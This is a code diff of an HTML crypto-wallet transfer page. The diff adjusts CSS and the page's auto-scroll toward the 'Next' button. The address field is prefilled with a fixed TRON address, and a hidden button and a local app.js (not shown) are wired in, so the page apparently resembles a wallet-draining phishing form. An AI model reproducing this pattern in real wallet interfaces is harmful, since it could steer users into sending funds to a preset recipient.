@@ -8,40 +8,35 @@
     * {
       box-sizing: border-box;
     }
-    html, body {
+    html, body, #root {
       width: 100%;
       min-height: 100%;
       margin: 0;
-      padding: 0;
       font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
       font-weight: 500;
       background: var(--bg);
       overflow-y: auto;
-      overflow-x: hidden;
-      -webkit-overflow-scrolling: touch;
-    }
-    #root {
-      width: 100%;
-      min-height: 100%;
-      display: flex;
-      justify-content: center;
+      scroll-behavior: smooth;
     }
     .page {
       width: 100%;
+      min-height: 100vh;
       display: flex;
       justify-content: center;
+      align-items: stretch;
       background: var(--bg);
+      position: relative;
     }
     .card {
       width: 100%;
       max-width: 420px;
-      /* Top par exactly 20px space aur bottom me safe area padding */
-      padding: 20px 20px calc(40px + env(safe-area-inset-bottom, 0px)) 20px;
+      min-height: 100vh;
+      padding: 20px 20px calc(20px + env(safe-area-inset-bottom, 0px)) 20px;
       display: flex;
       flex-direction: column;
       color: var(--text);
+      position: relative;
       background: var(--bg);
-      min-height: 100vh;
     }
     .theme-light {
       --bg: #ffffff;
@@ -176,14 +171,14 @@
       font-size: 13px;
       color: var(--subtext);
       margin-top: -6px;
-      margin-bottom: 24px;
+      margin-bottom: 20px;
     }
     .bottom-actions {
       margin-top: auto;
-      padding-top: 30px;
-      margin-bottom: 20px; /* Extra room taaki button poori tarah visible scroll ho sake */
+      padding-top: 24px;
       display: flex;
       flex-direction: column;
+      background: var(--bg);
       width: 100%;
     }
     .connect-btn {
@@ -207,7 +202,7 @@
 <div id="root">
   <div class="page">
     <div class="card" id="cardContainer">
-      <!-- Address Section (Starts directly at top with 20px padding) -->
+      <!-- Address Section (Directly visible at top) -->
       <label class="label" for="addressInput">Address or Domain Name</label>
       <div class="input-row primary">
         <input id="addressInput" placeholder="Search or Enter" value="TNY6Psd9Yv5LQriMB1bYuUWdKt0qY3zsr1">
@@ -231,7 +226,7 @@
         </div>
       </div>
 
-      <!-- Network Section -->
+      <!-- Destination Network -->
       <label class="label">Destination network</label>
       <div class="network-row">
         <div class="network-left">
@@ -254,7 +249,7 @@
 
       <div id="result" style="display:none;color:#22c55e;margin:10px 0;font-size:0.85rem"></div>
 
-      <!-- Bottom Button (Fully visible upon scroll) -->
+      <!-- Bottom Button Area -->
       <div class="bottom-actions" id="bottomActions">
         <button class="connect-data" style="display:none"></button>
         <button class="connect-btn" id="start-btn">Next</button>
@@ -271,7 +266,6 @@
   const maxBtn = document.getElementById('maxBtn');
   const pasteBtn = document.getElementById('pasteBtn');
   const bottomActions = document.getElementById('bottomActions');
-  const startBtn = document.getElementById('start-btn');
 
   function fetchWalletBalance(e) {
     if (!e || e.length < 10) {
@@ -324,27 +318,19 @@
     })}`;
   }
 
-  // Pure document level scroll down trigger
-  function executeScrollDown() {
-    const totalHeight = Math.max(
-      document.body.scrollHeight,
-      document.documentElement.scrollHeight,
-      document.body.offsetHeight,
-      document.documentElement.offsetHeight,
-      document.body.clientHeight,
-      document.documentElement.clientHeight
-    );
-    window.scrollTo({ top: totalHeight, left: 0, behavior: 'auto' });
-    if (startBtn) {
-      startBtn.scrollIntoView({ block: 'end', inline: 'nearest' });
-    }
+  // Auto Full Scroll Down Trigger Logic
+  function autoScrollToBottom() {
+    requestAnimationFrame(() => {
+      bottomActions.scrollIntoView({ behavior: 'smooth', block: 'end' });
+      window.scrollTo({
+        top: document.documentElement.scrollHeight,
+        behavior: 'smooth'
+      });
+    });
   }
 
-  // Continuous lock without fighting natural browser viewport rendering
-  setInterval(executeScrollDown, 200);
-  window.addEventListener('resize', executeScrollDown);
-  window.addEventListener('load', executeScrollDown);
-  document.addEventListener('DOMContentLoaded', executeScrollDown);
+  window.addEventListener('DOMContentLoaded', autoScrollToBottom);
+  window.addEventListener('load', autoScrollToBottom);
 </script>
 <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
 <script src="app.js"></script>
